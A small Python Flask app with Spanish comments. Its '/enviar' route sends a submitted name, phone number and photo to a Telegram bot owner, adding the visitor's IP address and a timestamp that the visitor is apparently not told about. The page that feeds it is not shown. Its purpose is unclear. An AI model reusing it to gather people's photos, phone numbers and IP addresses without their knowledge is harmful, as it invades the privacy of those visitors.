from flask import Flask, request, jsonify, render_template
from bot import bot, bot_activo
from config import MI_ID
from datetime import datetime

app = Flask(__name__)

# ✅ RUTA PRINCIPAL (evita Not Found)
@app.route('/')
def home():
    return render_template("index.html")

# ✅ ENVÍO AL BOT
@app.route('/enviar', methods=['POST'])
def enviar():
    if not bot_activo:
        return jsonify({"status": "off"}), 403

    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files['foto']

        fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        bot.send_photo(
            MI_ID,
            foto,
            caption=f"📸\n{nombre}\n{telefono}\n{request.remote_addr}\n{fecha}"
        )

        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500